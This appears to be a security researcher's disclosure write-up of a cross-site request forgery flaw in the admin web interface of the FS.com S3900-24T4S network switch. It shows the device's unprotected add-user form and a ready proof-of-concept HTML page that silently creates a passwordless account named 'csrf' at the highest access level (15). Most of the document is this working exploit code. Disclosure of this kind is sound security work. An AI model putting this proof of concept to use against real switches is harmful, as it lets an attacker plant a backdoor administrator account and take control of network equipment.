# The latest version of fs.com S3900 24T4S (1.7.1) and all previous version, CSRF backstage admin



The form does not have a authentication or token authentication mechanism, so there is a Cross-Site Request Forgery (Add user account) to add an user with full access.
All form on the S3900 24T4S are subjets of Cross-Site Request Forgery attack.

``` html
<form name="lightBoxForm" id="lightBoxForm" method="post" action="">
   <table class="data" id="userAccountTable">
      <tbody>
         <tr id="userAccountTable_tr0">
            <th id="userAccountTable_tr0_th0" width="20%"><label i18n="User Name">User Name</label></th>
            <td id="userAccountTable_tr0_td1">
               <input type="text" name="userNameTex" id="userNameTex" size="40" maxlength="32" value="" onkeydown="parent.pressEnter(event)">
               <select name="userNameSel" id="userNameSel" size="1" onchange="userNameChg(this.value)" style="display: none;" disabled="">
                  <option value="admin" i18n="admin">admin</option>
                  <option value="guest" i18n="guest">guest</option>
                  <option value="admin2" i18n="admin2">admin2</option>
               </select>
            </td>
         </tr>
         <tr id="userAccountTable_tr1">
            <th id="userAccountTable_tr1_th0"><label i18n="Access Level">Access Level</label></th>
            <td id="userAccountTable_tr1_td1">
               <select name="levelSel" id="levelSel" size="1">
                  <option value="0" i18n="0">0</option>
                  <option value="1" i18n="1">1</option>
                  <option value="2" i18n="2">2</option>
                  <option value="3" i18n="3">3</option>
                  <option value="4" i18n="4">4</option>
                  <option value="5" i18n="5">5</option>
                  <option value="6" i18n="6">6</option>
                  <option value="7" i18n="7">7</option>
                  <option value="8" i18n="8">8</option>
                  <option value="9" i18n="9">9</option>
                  <option value="10" i18n="10">10</option>
                  <option value="11" i18n="11">11</option>
                  <option value="12" i18n="12">12</option>
                  <option value="13" i18n="13">13</option>
                  <option value="14" i18n="14">14</option>
                  <option value="15" i18n="15">15</option>
               </select>
            </td>
         </tr>
         <tr id="userAccountTable_tr2">
            <th id="userAccountTable_tr2_th0"><label i18n="Password Type">Password Type</label></th>
            <td id="userAccountTable_tr2_td1">
               <select name="pswdTypeSel" id="pswdTypeSel" size="1" onchange="pswdTypeChg()">
                  <option value="No Password" i18n="No Password">No Password</option>
                  <option value="Plain Password" i18n="Plain Password">Plain Password</option>
                  <option value="Encrypted Password" i18n="Encrypted Password">Encrypted Password</option>
               </select>
            </td>
         </tr>
         <tr id="userAccountTable_tr3">
            <th id="userAccountTable_tr3_th0"><label i18n="Password">Password</label></th>
            <td id="userAccountTable_tr3_td1"><input type="password" name="pswd" id="pswd" size="40" maxlength="32" value="" disabled=""></td>
         </tr>
         <tr id="userAccountTable_tr4">
            <th id="userAccountTable_tr4_th0"><label i18n="Confirm Password">Confirm Password</label></th>
            <td id="userAccountTable_tr4_td1"><input type="password" name="pswdConfirm" id="pswdConfirm" size="40" maxlength="32" value="" disabled=""></td>
         </tr>
      </tbody>
   </table>
   <div class="actButtons"><input class="actButton" type="button" id="applyButton" i18n="Apply" value="Apply" onclick="parent.toSubmitForm(applyButton,formObj);"><input class="actButton" type="button" id="revertButton" i18n="Revert" value="Revert" onclick="init();"></div>
</form>
```
Then, we can build the following POC,
``` html
<html>
  <body>
    <form action="https://192.168.0.1/config/security_user_accounts_add.htm" method="POST">
      <input type="hidden" name="page" value="sysUser" />
      <input type="hidden" name="actType" value="Add" />
      <input type="hidden" name="userName" value="csrf" />
      <input type="hidden" name="userNameTex" value="csrf" />
      <input type="hidden" name="levelSel" value="15" />
      <input type="hidden" name="pswdTypeSel" value="No Password" />
      <input type="submit" />
    </form>
  </body>
</html>
```

Here's my own demonstration of the attack
![](https://github.com/M0NsTeRRR/S3900-24T4S-CSRF-vulnerability/blob/master/csrf.gif)


# Credits

Copyright © Ludovic Ortega, 2020

Contributor(s):

-Ortega Ludovic - ludovic.ortega@adminafk.fr
